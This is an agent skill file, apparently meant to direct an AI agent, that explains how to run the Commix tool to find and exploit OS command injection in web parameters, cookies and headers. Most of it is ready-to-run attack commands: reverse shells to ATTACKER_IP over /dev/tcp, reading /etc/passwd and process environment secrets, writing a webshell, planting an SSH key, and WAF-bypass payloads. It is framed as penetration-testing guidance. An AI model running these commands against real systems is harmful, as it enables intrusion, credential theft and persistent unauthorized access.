---
name: commix
description: >
  Operate Commix — an automated OS command injection exploitation tool that detects and
  exploits command injection vulnerabilities in web parameters, cookies, and headers.
  Use when testing for OS command injection in GET/POST parameters, cookies, HTTP headers,
  or when manual injection is confirmed and automation is needed for shell access. Covers
  installation, injection techniques (results-based, time-based, file-based), shell access,
  tamper scripts, authentication, proxy, and command injection testing methodology.
metadata:
  author: redhoundinfosec
  version: '1.0'
  repo: https://github.com/commixproject/commix
  language: Python
---

# commix Agent Skill

## When to Use This Skill

Use this skill when:
- A web parameter, cookie, or HTTP header appears to execute OS commands (command injection)
- Manual testing confirms a command injection vector and automation is needed
- Needing to escalate from detected injection to an OS shell or reverse shell
- Testing API endpoints or custom application parameters for command injection
- Requiring WAF bypass via tamper scripts for command injection payloads
- Performing time-based blind command injection where output is not returned

## What Commix Does

Commix (commixproject/commix, ~4.8k GitHub stars) is a Python-based tool that automates the
detection and exploitation of OS command injection vulnerabilities in web applications. It
supports GET and POST parameters, cookies, HTTP headers (User-Agent, Referer, X-Forwarded-For,
custom), and file upload fields. Commix implements multiple injection techniques (results-based,
time-based blind, file-based out-of-band) and can escalate successful injections to interactive
OS shells, reverse shells, or execute arbitrary commands.

## Installation

### pip
```bash
pip3 install commix
commix --help
```

### From Source (recommended — most up to date)
```bash
git clone https://github.com/commixproject/commix.git
cd commix
python3 commix.py --help
```

### apt (Kali)
```bash
sudo apt update && sudo apt install -y commix
```

### Docker
```bash
docker pull commixproject/commix
docker run --rm commixproject/commix --help
docker run --rm commixproject/commix -u "http://target.com/page?id=1"
```

## Core Concepts

### Injection Techniques

| Technique | Code | Description |
|-----------|------|-------------|
| Results-based Classic | `--technique=C` | Payload output appended to response |
| Results-based Dynamic Code Eval | `--technique=D` | Uses eval() to execute OS commands |
| Time-based | `--technique=T` | Blind — infers result from response delay |
| File-based | `--technique=F` | Writes output to file, reads via HTTP |

Commix auto-detects which technique works; specify with `--technique` to force one.

### Injection Contexts
Commix tests whether the injection point is inside:
- A command string: `ping -c 1 PAYLOAD` → inject with `;id`
- A string that's passed to a shell function: `system("PAYLOAD")` → direct injection
- An eval context: `eval("PAYLOAD")` → code injection

### Payload Delimiters
```
;           Unix command separator
&&          AND chaining
||          OR chaining
`cmd`       Backtick subshell
$(cmd)      $() subshell
%0a         URL-encoded newline (shell newline = command separator)
|           Pipe
```

## CLI Reference

### Basic Scanning
```bash
# GET parameter injection test
python3 commix.py -u "http://target.com/ping?host=127.0.0.1"

# Test all GET parameters
python3 commix.py -u "http://target.com/page?host=127.0.0.1&debug=0"

# Specific parameter only
python3 commix.py -u "http://target.com/page?host=127.0.0.1" -p host
```

### POST Data Injection
```bash
# URL-encoded POST body
python3 commix.py -u "http://target.com/ping" \
  --data "host=127.0.0.1&submit=submit"

# JSON POST body
python3 commix.py -u "http://target.com/api/exec" \
  --data '{"command":"ping","target":"127.0.0.1"}' \
  -H "Content-Type: application/json"

# XML POST body
python3 commix.py -u "http://target.com/xml-handler" \
  --data "<request><host>127.0.0.1</host></request>" \
  -H "Content-Type: application/xml"
```

### Cookie Injection
```bash
# Test cookie value for injection
python3 commix.py -u "http://target.com/dashboard" \
  --cookie "user=admin; debug=false" \
  -p debug

# All cookie values tested
python3 commix.py -u "http://target.com/dashboard" \
  --cookie "role=user; pref=en"
```

### Header Injection
```bash
# User-Agent injection
python3 commix.py -u "http://target.com/log" \
  --headers "User-Agent: Mozilla/5.0*"
# The * tells commix to inject at that position

# Referer injection
python3 commix.py -u "http://target.com/log" \
  --headers "Referer: http://evil.com*"

# X-Forwarded-For injection (IP logging bypass / injection)
python3 commix.py -u "http://target.com/page" \
  --headers "X-Forwarded-For: 127.0.0.1*"

# Custom header injection
python3 commix.py -u "http://target.com/api" \
  --headers "X-API-Version: 1.0*"
```

### Injection Technique Selection
```bash
# Force results-based classic technique
python3 commix.py -u "http://target.com/ping?host=127.0.0.1" \
  --technique=C

# Force time-based blind (when output not in response)
python3 commix.py -u "http://target.com/ping?host=127.0.0.1" \
  --technique=T

# Force file-based technique
python3 commix.py -u "http://target.com/ping?host=127.0.0.1" \
  --technique=F \
  --web-root /var/www/html

# Try all techniques
python3 commix.py -u "http://target.com/ping?host=127.0.0.1" \
  --technique=CDF
```

### OS Shell and Command Execution
```bash
# Get an interactive pseudo-shell after successful injection
python3 commix.py -u "http://target.com/ping?host=127.0.0.1" \
  --os-shell

# Execute a single OS command
python3 commix.py -u "http://target.com/ping?host=127.0.0.1" \
  --os-cmd "id"

# Execute multiple commands (semicolon-separated)
python3 commix.py -u "http://target.com/ping?host=127.0.0.1" \
  --os-cmd "id; whoami; cat /etc/passwd"
```

### Reverse Shell
```bash
# Trigger a reverse shell callback
# Set up listener first:
nc -lvnp 4444

# Then run commix:
python3 commix.py -u "http://target.com/ping?host=127.0.0.1" \
  --os-shell

# Inside the commix shell, execute reverse shell:
commix$ bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Or use --os-cmd directly
python3 commix.py -u "http://target.com/ping?host=127.0.0.1" \
  --os-cmd "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
```

### Authentication
```bash
# HTTP Basic authentication
python3 commix.py -u "http://target.com/api?host=test" \
  --auth-cred "admin:password" \
  --auth-type basic

# HTTP Digest authentication
python3 commix.py -u "http://target.com/api?host=test" \
  --auth-cred "admin:password" \
  --auth-type digest

# Cookie-based auth (pass authenticated session)
python3 commix.py -u "http://target.com/app?host=test" \
  --cookie "PHPSESSID=authenticated_session_id"
```

### Proxy Support
```bash
# Route through Burp Suite
python3 commix.py -u "http://target.com/ping?host=127.0.0.1" \
  --proxy http://127.0.0.1:8080

# SOCKS5 proxy (for pivoting)
python3 commix.py -u "http://192.168.1.10/ping?host=127.0.0.1" \
  --proxy socks5://127.0.0.1:1080

# Ignore SSL errors when proxying
python3 commix.py -u "https://target.com/ping?host=127.0.0.1" \
  --proxy http://127.0.0.1:8080 \
  --ignore-proxy-error
```

### Tamper Scripts
Tamper scripts modify payloads to bypass WAFs and input filters:
```bash
# List available tamper scripts
ls $(python3 -c "import commix; print(commix.__path__[0])")/tamper/ 2>/dev/null
# Or for git clone:
ls commix/src/tamper/

# Apply a tamper script
python3 commix.py -u "http://target.com/ping?host=127.0.0.1" \
  --tamper="space2ifs"       # Replace spaces with IFS variable

python3 commix.py -u "http://target.com/ping?host=127.0.0.1" \
  --tamper="backslashes"     # Add backslash before each char

python3 commix.py -u "http://target.com/ping?host=127.0.0.1" \
  --tamper="hexencode"       # Hex-encode payload

python3 commix.py -u "http://target.com/ping?host=127.0.0.1" \
  --tamper="base64encode"    # Base64-encode payload

# Chain multiple tamper scripts
python3 commix.py -u "http://target.com/ping?host=127.0.0.1" \
  --tamper="space2ifs,hexencode"
```

### Batch Mode (Non-Interactive)
```bash
# Skip all yes/no prompts (use defaults)
python3 commix.py -u "http://target.com/ping?host=127.0.0.1" \
  --batch

# Batch mode + auto shell
python3 commix.py -u "http://target.com/ping?host=127.0.0.1" \
  --batch --os-shell
```

### Time-Based Blind Options
```bash
# Adjust time delay threshold (seconds, default varies)
python3 commix.py -u "http://target.com/ping?host=127.0.0.1" \
  --technique=T --time-sec=5

# Increase requests timeout for slow targets
python3 commix.py -u "http://target.com/ping?host=127.0.0.1" \
  --timeout 30
```

### File Operations via Injection
```bash
# Read a file from the server
python3 commix.py -u "http://target.com/ping?host=127.0.0.1" \
  --file-read "/etc/passwd"

# Write a file to the server (e.g., webshell)
python3 commix.py -u "http://target.com/ping?host=127.0.0.1" \
  --file-write /tmp/shell.php \
  --file-dest /var/www/html/shell.php
```

### Output and Logging
```bash
# Save output to file
python3 commix.py -u "http://target.com/ping?host=127.0.0.1" \
  --output-dir /tmp/commix_results

# Verbose output
python3 commix.py -u "http://target.com/ping?host=127.0.0.1" -v

# Very verbose (show all requests)
python3 commix.py -u "http://target.com/ping?host=127.0.0.1" -vv

# Traffic file (log all HTTP transactions)
python3 commix.py -u "http://target.com/ping?host=127.0.0.1" \
  --traffic-file /tmp/commix_traffic.log
```

## Command Injection Testing Methodology

### Phase 1: Identify Injection Points
Look for parameters that likely invoke OS commands:
- IP address fields: `ping`, `traceroute`, `nslookup`
- File path fields: `file`, `path`, `dir`, `log`
- Domain/hostname fields: `host`, `server`, `target`
- Filename upload fields with processing
- Any field processed by `system()`, `exec()`, `popen()`, `shell_exec()`

```bash
# Manual probe before commix
curl "http://target.com/ping?host=127.0.0.1;sleep+5"
# If response delays 5 seconds → time-based blind injection confirmed
```

### Phase 2: Manual Confirmation
```bash
# Test with time-based payload
time curl -s "http://target.com/ping?host=127.0.0.1;sleep+5" > /dev/null
# If real_time ≈ 5s → vulnerable

# Test with output-based payload
curl -s "http://target.com/ping?host=127.0.0.1;id"
# If "uid=33(www-data)" in response → results-based injection

# Test in POST body
curl -s -X POST http://target.com/ping \
  --data "host=127.0.0.1;id"
```

### Phase 3: Automate with Commix
```bash
# Confirm and exploit
python3 commix.py -u "http://target.com/ping?host=127.0.0.1" --batch

# Get shell
python3 commix.py -u "http://target.com/ping?host=127.0.0.1" \
  --batch --os-shell

# Enumerate via shell
commix$ id
commix$ cat /etc/passwd
commix$ which python3 perl ruby php
commix$ find / -perm -4000 -type f 2>/dev/null   # SUID binaries
commix$ cat /proc/1/environ | tr '\0' '\n'        # Env vars (secrets)
```

### Phase 4: Privilege Escalation Prep
```bash
# From commix os-shell, pivot to interactive shell
# Option 1: Python pty
commix$ python3 -c 'import pty;pty.spawn("/bin/bash")'

# Option 2: Reverse shell
commix$ bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'

# Option 3: Drop SSH key
commix$ mkdir -p /home/www-data/.ssh
commix$ echo 'SSH_PUBLIC_KEY' >> /home/www-data/.ssh/authorized_keys
```

## Common Bypasses

### Space Filter Bypass
```bash
# IFS variable (Internal Field Separator)
# ;cat${IFS}/etc/passwd
python3 commix.py -u "http://target.com/ping?host=127.0.0.1" \
  --tamper="space2ifs"

# Tab character
# ;cat%09/etc/passwd
```

### Semicolon Filter Bypass
```bash
# Newline separator
# %0aid
curl "http://target.com/ping?host=127.0.0.1%0aid"

# Using && or ||
curl "http://target.com/ping?host=127.0.0.1&&id"
curl "http://target.com/ping?host=doesntexist||id"
```

### Keyword Filter Bypass (cat, id, etc.)
```bash
# Use variable splitting: c${a}at → cat
c${undeclared_var}at /etc/passwd

# Base64 encode the command
echo "cat /etc/passwd" | base64   # Y2F0IC9ldGMvcGFzc3dkCg==
# Execute: echo Y2F0IC9ldGMvcGFzc3dkCg== | base64 -d | bash
```

## Integration with Other Tools

| Stage | Tool | Purpose |
|-------|------|---------|
| Injection discovery | Arjun | Find hidden parameters that may be injectable |
| Traffic capture | Burp Suite | `--proxy` to capture commix payloads |
| Manual confirmation | curl | Verify injection before automating |
| Post-exploitation | Metasploit | Use commix shell to pivot to meterpreter |
| Port forwarding | chisel/ligolo-ng | Forward reverse shell through proxy |

```bash
# Burp → Commix workflow
# 1. Intercept request in Burp
# 2. Copy as curl command
# 3. Convert to commix syntax
# curl: curl 'http://target.com/ping?host=127.0.0.1'
# commix: python3 commix.py -u 'http://target.com/ping?host=127.0.0.1'
```

## Troubleshooting

**"No injection point found" on known-vulnerable parameter**
```bash
# Manually specify the parameter
python3 commix.py -u "http://target.com/ping?host=127.0.0.1&v=1" -p host

# Try different technique
python3 commix.py -u "http://target.com/ping?host=127.0.0.1" --technique=T

# Increase delay for slow time-based detection
python3 commix.py -u "http://target.com/ping?host=127.0.0.1" \
  --technique=T --time-sec=8 --timeout 30
```

**WAF blocking payloads**
```bash
# Apply tamper scripts
python3 commix.py -u "http://target.com/ping?host=127.0.0.1" \
  --tamper="space2ifs,backslashes"

# Route through Burp to analyse what's being blocked
python3 commix.py -u "http://target.com/ping?host=127.0.0.1" \
  --proxy http://127.0.0.1:8080

# Add delay between requests
python3 commix.py -u "http://target.com/ping?host=127.0.0.1" \
  --delay 2
```

**SSL certificate errors**
```bash
python3 commix.py -u "https://target.com/ping?host=127.0.0.1" \
  --ignore-ssl-errors
```

**os-shell not responding / hanging**
```bash
# Shell may be non-interactive — try a direct command
python3 commix.py -u "http://target.com/ping?host=127.0.0.1" \
  --os-cmd "id && hostname && uname -a"

# Get proper TTY via reverse shell
# Set up: nc -lvnp 4444
python3 commix.py -u "http://target.com/ping?host=127.0.0.1" \
  --os-cmd 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"'
```
---

> Built by [Red Hound InfoSec](https://redhound.us) — On-demand offensive security expertise for SMBs.
> 20+ years of Fortune 500 experience. Penetration testing, attack surface analysis, and security consulting.
>
> [redhound.us](https://redhound.us) | [GitHub](https://github.com/redhoundinfosec) | [Book a consultation](https://redhound.us/#contact)
